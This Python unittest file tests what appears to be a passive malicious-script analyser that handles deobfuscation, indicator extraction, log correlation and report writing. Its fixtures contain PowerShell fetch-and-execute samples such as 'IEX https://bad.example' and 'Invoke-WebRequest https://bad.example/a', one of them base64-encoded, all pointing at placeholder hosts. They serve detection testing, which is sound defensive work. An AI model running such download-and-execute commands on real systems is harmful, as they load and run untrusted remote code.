from __future__ import annotations

import argparse
import io
import json
import os
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest.mock import patch

from infa_sled.cli import build_parser, config_from_args, main, parse_formats
from infa_sled.config import AnalysisConfig
from infa_sled.errors import InputFileError, ReportError
from infa_sled.models import (
    AnalysisResult,
    Finding,
    Hashes,
    IOC,
    ObfuscationSignal,
    SourceMetadata,
    TimestampInfo,
    Transformation,
)
from infa_sled.pipeline import analyze_and_write, analyze_file, merge_findings
from infa_sled.reporting import (
    analysis_directory,
    atomic_write,
    build_pdf,
    pdf_lines,
    pdf_text,
    render_json,
    render_pdf,
    render_terminal,
    report_payload,
    safe_component,
    terminal_text,
    write_reports,
)


def sample_result() -> AnalysisResult:
    return AnalysisResult(
        schema_version="1.0",
        source=SourceMetadata("C:/tmp/<bad>.ps1", "<bad>.ps1", 10, "2026-01-01T00:00:00Z"),
        language="powershell",
        hashes=Hashes("a" * 64, "b" * 40, "c" * 32),
        started_at=TimestampInfo("2026-01-01T00:00:00Z", "system"),
        completed_at=TimestampInfo("2026-01-01T00:00:01Z", "system"),
        findings=(
            Finding("PS-1", "Podejrzane <x>", "high", "opis", 1, "IEX <script>", ("tag",)),
        ),
        obfuscation_signals=(ObfuscationSignal("base64", "high", 1, "encoded"),),
        transformations=(Transformation("base64", 1, "AAA", "IEX"),),
        iocs=(IOC("domain", "bad.example", ("original",)),),
        connection_matches=(),
        reputation=(),
        warnings=("uwaga",),
        deobfuscated_text="IEX https://bad.example",
    )


class ReportingTests(unittest.TestCase):
    def test_safe_component_transliterates_and_bounds_names(self) -> None:
        self.assertEqual(safe_component("  żółć / test  "), "zoc-test")
        self.assertEqual(safe_component("..."), "analysis")
        self.assertLessEqual(len(safe_component("x" * 200)), 80)

    def test_report_payload_and_json_include_summary(self) -> None:
        result = sample_result()
        payload = report_payload(result)
        self.assertEqual(payload["summary"]["finding_count"], 1)
        rendered = json.loads(render_json(result))
        self.assertEqual(rendered["hashes"]["sha256"], "a" * 64)

    def test_terminal_text_removes_control_sequences(self) -> None:
        self.assertEqual(terminal_text("ok\x1b[31m\nnext", limit=20), "ok [31m next")
        self.assertEqual(terminal_text("abcdef", limit=3), "abc")

    def test_render_terminal_explains_stages_and_results(self) -> None:
        rendered = render_terminal(sample_result())
        self.assertIn("ETAPY ANALIZY", rendered)
        self.assertIn("DETEKCJE (1)", rendered)
        self.assertIn("TRANSFORMACJE (1)", rendered)
        self.assertIn("IEX <script>", rendered)
        self.assertIn("Analizowany kod nie zostal uruchomiony", rendered)

    def test_pdf_helpers_escape_wrap_and_build_document(self) -> None:
        self.assertEqual(pdf_text("a(b)\\ż"), "a\\(b\\)\\\\z")
        lines = pdf_lines(sample_result())
        self.assertIn("RAPORT PASYWNEJ ANALIZY SKRYPTU", lines)
        document = build_pdf([f"line {index}" for index in range(70)])
        self.assertTrue(document.startswith(b"%PDF-1.4"))
        self.assertIn(b"/Count 2", document)
        self.assertTrue(render_pdf(sample_result()).endswith(b"%%EOF\n"))

    def test_atomic_write_analysis_directory_and_reports(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            path = atomic_write(root / "nested" / "file.bin", b"value")
            self.assertEqual(path.read_bytes(), b"value")
            result = sample_result()
            analysis_dir = analysis_directory(result, root)
            self.assertEqual(
                analysis_dir.name,
                "bad-powershell__2026-01-01_00-00-01_UTC__sha256-aaaaaaaa",
            )
            outputs = write_reports(result, root, ("json", "pdf"))
            self.assertEqual({path.suffix for path in outputs}, {".json", ".pdf", ".txt"})
            self.assertTrue(all(path.is_file() for path in outputs))
            with self.assertRaises(ReportError):
                write_reports(result, root, ("xml",))


class PipelineTests(unittest.TestCase):
    def test_merge_findings_marks_only_new_transformed_detections(self) -> None:
        original = (Finding("A", "a", "low", "d", 1, "same", ()),)
        transformed = (
            Finding("A", "a", "low", "d", 1, "same", ()),
            Finding("B", "b", "high", "d", 2, "new", ()),
        )
        merged = merge_findings(original, transformed)
        self.assertEqual(len(merged), 2)
        self.assertIn("deobfuscated", merged[1].tags)

    def test_analyze_file_covers_hashes_rules_deobfuscation_iocs_and_logs(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            script = root / "sample.ps1"
            encoded = "SUVYIGh0dHBzOi8vYmFkLmV4YW1wbGUvYQ=="
            original = f"$x='{encoded}'\nInvoke-WebRequest https://bad.example/a\n"
            script.write_text(original, encoding="utf-8")
            log = root / "connections.log"
            log.write_text("2026-01-01T00:00:00Z https://bad.example/a\n", encoding="utf-8")
            config = AnalysisConfig(connection_logs=(log,), report_formats=("json",))
            result = analyze_file(script, config)
            self.assertEqual(script.read_text(encoding="utf-8"), original)
            self.assertTrue(result.findings)
            self.assertTrue(result.transformations)
            self.assertTrue(result.iocs)
            self.assertTrue(result.connection_matches)
            self.assertIsNotNone(result.deobfuscated_text)

    def test_analyze_file_records_bad_log_as_warning(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            script = Path(directory) / "sample.sh"
            script.write_text("echo ok", encoding="utf-8")
            config = AnalysisConfig(connection_logs=(Path(directory) / "missing.log",))
            result = analyze_file(script, config)
            self.assertIn("Log nie istnieje", result.warnings[0])

    def test_analyze_and_write_creates_requested_reports(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            script = root / "sample.js"
            script.write_text("const host='bad.example';", encoding="utf-8")
            config = AnalysisConfig(output_dir=root / "out", report_formats=("json",))
            result, outputs = analyze_and_write(script, config)
            self.assertEqual(result.language, "javascript")
            self.assertEqual(len(outputs), 1)
            self.assertEqual(outputs[0].suffix, ".json")

    def test_committed_language_examples_correlate_two_log_entries_each(self) -> None:
        repository = Path(__file__).resolve().parents[1]
        examples = (
            (
                "suspicious_obfuscated.ps1",
                "connection_history.log",
                "powershell",
                {"https://bad.example/a", "192.0.2.10"},
            ),
            (
                "suspicious_obfuscated.js",
                "connection_history_javascript.log",
                "javascript",
                {"https://bad-js.example/a", "198.51.100.20"},
            ),
            (
                "suspicious_obfuscated.sh",
                "connection_history_bash.log",
                "bash",
                {"https://bad-bash.example/a", "203.0.113.25"},
            ),
        )
        for script_name, log_name, language, expected_matches in examples:
            with self.subTest(language=language):
                script = repository / "examples" / script_name
                log = repository / "examples" / log_name
                original = script.read_bytes()
                result = analyze_file(script, AnalysisConfig(connection_logs=(log,)))
                self.assertEqual(script.read_bytes(), original)
                self.assertEqual(result.language, language)
                self.assertGreaterEqual(len(result.findings), 2)
                self.assertEqual(
                    {item.kind for item in result.obfuscation_signals},
                    {"base64", "hex-escapes", "string-concatenation"},
                )
                self.assertEqual(len(result.connection_matches), 2)
                self.assertEqual(
                    {item.ioc_value for item in result.connection_matches},
                    expected_matches,
                )


class CliTests(unittest.TestCase):
    def test_parse_formats_accepts_supported_and_rejects_unknown(self) -> None:
        self.assertEqual(parse_formats("JSON,pdf,json"), ("json", "pdf"))
        with self.assertRaises(argparse.ArgumentTypeError):
            parse_formats("html")

    def test_build_parser_and_config_from_args(self) -> None:
        parser = build_parser()
        args = parser.parse_args(
            [
                "sample.ps1",
                "--formats",
                "json",
                "--enable-network",
                "--reputation",
                "virustotal",
            ]
        )
        with patch.dict(os.environ, {"INFA_SLED_API_KEY": "secret"}):
            config = config_from_args(args)
        self.assertEqual(config.report_formats, ("json",))
        self.assertEqual(config.reputation_api_key, "secret")
        self.assertEqual(parser.parse_args(["sample.ps1"]).output, Path("report"))
        self.assertEqual(parser.parse_args(["sample.ps1"]).mode, "both")

    def test_main_reports_success_and_controlled_error(self) -> None:
        result = sample_result()
        with patch("infa_sled.cli.analyze_and_write", return_value=(result, (Path("report.json"),))):
            stdout = io.StringIO()
            with redirect_stdout(stdout):
                code = main(["sample.ps1", "--formats", "json"])
        self.assertEqual(code, 0)
        self.assertIn("Analiza zakonczona", stdout.getvalue())
        self.assertIn("ETAPY ANALIZY", stdout.getvalue())

        with patch("infa_sled.cli.analyze_file", return_value=result):
            stdout = io.StringIO()
            with redirect_stdout(stdout):
                code = main(["sample.ps1", "--mode", "terminal"])
        self.assertEqual(code, 0)
        self.assertIn("KORELACJE Z LOGAMI", stdout.getvalue())
        self.assertNotIn("Zapisane pliki", stdout.getvalue())

        with patch("infa_sled.cli.analyze_and_write", side_effect=InputFileError("missing")):
            stderr = io.StringIO()
            with redirect_stderr(stderr):
                code = main(["missing.ps1"])
        self.assertEqual(code, 2)
        self.assertIn("missing", stderr.getvalue())


if __name__ == "__main__":
    unittest.main()
